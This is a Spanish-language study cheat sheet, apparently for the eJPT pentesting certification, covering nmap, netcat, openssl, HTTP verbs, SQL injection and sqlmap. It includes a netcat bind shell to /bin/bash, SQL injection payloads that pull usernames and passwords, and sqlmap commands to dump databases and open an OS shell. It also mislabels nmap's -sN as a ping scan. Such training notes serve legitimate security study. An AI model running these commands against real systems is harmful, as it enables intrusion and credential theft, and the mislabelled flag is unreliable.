# eJPT
 
   ## Routing table
   
   Ver tabla de rutas:
   
    netstat -rn
    Kernel IP routing table
    Destination      Gateway        Genmask         Flags   MSS Window  irtt Iface
    ...
    192.168.88.0     10.10.34.1     255.255.255.0   UG        0 0          0 tap0
    ...
 
 Añadir ruta:
 
    ip route add 192.168.88.0/24 via 10.10.34.1
 
   ## Network mapping

   Para hacer ping a un rango de IP's, utilizamos fping:

      fping -g -a IPRANGE

   -a nos muestra los hosts activos

   -g indica que hacemos un ping de un rango de IP's
   
   Para evitar errores, añadimos la salida a /dev/null:
   
     fping -g -a IPRANGE 2>/dev/null
     
   ## nmap
   
   Ping scan (nos dice qué hosts están activos):
   
    nmap -sN IP

  También podemos hacerlo desde un fichero .txt con IP's:
  
    nmap -sn -iL hostlist.txt
    
  Para hacer OS fingerprinting y conocer los detalles del SO:
  
    nmap -Pn -O <target>
    
  -Pn = evitamos ping scan
  
  También podemos utilizar --osscan-limit que irá más rápido y mostrará solamente objetos prometedores. También --osscan-guess cuando nmap no puede detectar nada pero muestra lo que más se aproxima:
  
    nmap -Pn -O --osscan-limit <target>
    nmap -Pn -O --osscan-guess <target>
    
## Tipos de escaneo con nmap

###### TCP SCAN

 Determina qué puertos TCP y UDP están abiertos y qué demonio está escuchando en esos puertos (software y versión), enviando señales al target y analizando la respuesta. Establece una conexión:
 
 <img src="https://user-images.githubusercontent.com/111526713/189317504-3e2cc9a2-0ced-47ee-a3c4-e4e271c9ddca.png" width="400" />

###### SYN SCAN

 Para evitar detecciones y que el daemon log de la aplicación registre el escaneo, se utiliza el SYN SCAN. NO establece una conexión, por lo que no deja rastro y es más difícil de detectar. Envía una señal RST para no crear la conexión.
 
 <img src="https://user-images.githubusercontent.com/111526713/189333458-edcb269b-d42d-4f15-9496-85f5fc12a1a1.png" width="500" />

Parámetros de escaneo:

    -sN -> ping scan

    -sT -> TCP connect scan : alternativa al SYN scan por falta de permisos o IPV6. Deja rastro ya que establece conexión.
    
    -sS -> SYN scan : sigilosa y poco molesta, no completa la conexión, cierra con RST (SYN/ACK -> open port, RST -> closed port)
    
    -sV -> version detection scan : lee el banner del daemon corriendo en el puerto para identificar la versión del software.
    
    -Pn -> fuerza el escaneo de puertos en un servidor y evita realizar el ping scan, tratándolos como si estuviesen abiertos por defecto.
    
   ## Netcat
   
   Abre una conexión sin procesar a un puerto web:
   
      nc -v <target_address> 80
   
  Enviamos una petición HTTP a través de HEAD o GET. Hay que saber que existen 2 línes en blanco entre la cabecera del mensaje y el mensaje en sí:
  
    ...
    GET / HTTP/1.1
    Host: www.ferrari.com # 2 líneas en blanco después de esta linea

    ...
    HEAD / HTTP/1.1
    Host: www.ferrari.com

    ...
    HEAD /en_en/ HTTP/1.1
    Host: www.ferrari.com
    
 ## Netcat server (listener)
 
    nc -lvp 8888
    
 -lvp = listener / verbosity / port
 
   Si escucha en 0.0.0.0 -> escucha desde todas las interfaces. 
   
   Para conectar a ese servidor en puerto 8888 desde otra terminal:
   
    nc -v 127.0.0.1 8888 (-e commando)
    
    Ejemplo: nc -lvp 1337 -e /bin/bash
    
## Openssl
   
 Si tenemos que enviar una petición HTTPS, tenemos que utilizar openssl, ya que netcat no funciona con peticiones https:
 
    $ openssl s_client -connect hack.me:443
    $ openssl s_client -connect hack.me:443 -debug
    $ openssl s_client -connect hack.me:443 -state
    $ openssl s_client -connect hack.me:443 -quiet

    # Evitamos el certificado

    GET / HTTP/1.1
    Host: hack.me

    OPTIONS / HTTP/1.1
    Host: hack.me

   ## HTTP verbs
   
      GET -> abre o solicita un recurso, por ejemplo, una web desde el navegador. Puede pasar argumentos.
      
      POST -> envía HTML format data. Parámetros en el body (p.ej username, passwd...)
      
      HEAD -> como GET pero sólo para la cabecera
      
      PUT -> sube ficheros al servidor
      
      DELETE -> borra ficheros del servidor
      
      OPTIONS -> consulta al web server acerca de los verbos HTTP activos
      
  Para saber qué verbos tenemos disponibles, utilizamos:
  
     nc -v victim.site 80
     
     OPTIONS /HTTP/1.0
     
     Allow: GET, HEAD, POST
     
 Para borrar un recurso:
 
    DELETE /path/to/resource.txt
   
Para subir un fichero, tenemos que saber antes cuanto es de largo nuestro payload.php:

    wc -m payload.php
    
    
## SQL Injection

 <img src="https://user-images.githubusercontent.com/111526713/189478292-06a88aac-0e42-4218-8368-596098aa8e50.png" width="400" />
 
 Se basa en tomar el control de las sentencias SQL utilizadas por la aplicación. 
 
    $connection = objeto que referencia la conexión con la DB
    $query = consulta a ejecutar
    $mysqli_query() = función que envía la consulta a la DB
    
Necesitamos un código SQL dinámico, por ejemplo:

    select name, description from products where ID=$id
    
    select name, description from products where ID='' or 'a'='a';
    
    http://urltest.com/view.php?id=1003'
    
    http://urltest.com/view.php?id='' or 1=1;-- -
    
    http://urltest.com/view.php?id='' or 1=21;-- -
    
 En este caso, buscamos por ID vacío, donde no nos devolverá ningún resultado, o donde la condición sea always true condition, donde mostrará todo el contenido de la tabla Productos.
 
 También se puede hacer utilizando UNION SELECT:
 
    select * from accounts where ID='' UNION SELECT username,pass from accounts where 'a'='a';
  
## SQLMAP

    sqlmap -u url 
           -b=database_banner
           --tables= nos muestra las tablas de la BD
           --current_db dbname -columns
           --dump=passwords
           --technique
           -p= parámtero a inyectar
           --users
           --dbs
           -D dbname -T table -C column1,column2 --dump
           
muestra las databases:

    sqlmap -u http://10.10.10.15/?id=4 --dbs

muestra las tablas:

    sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables

si no aparecen, guess tables utilizia los nombres más comunes:

    sqlmap -u http://10.10.10.15/?id=4 -D dbname --common-tables

dump de datos de una tabla:

    sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump

consiguiendo os shell:

    sqlmap -u http://10.10.10.15/?id=4 --os-shell

           
 Si tenemos que lanzarlo contra un login form (login.php)
 
      sqlmap -u url --data='user=a&pass=b' -p user --technique=B(oolean)
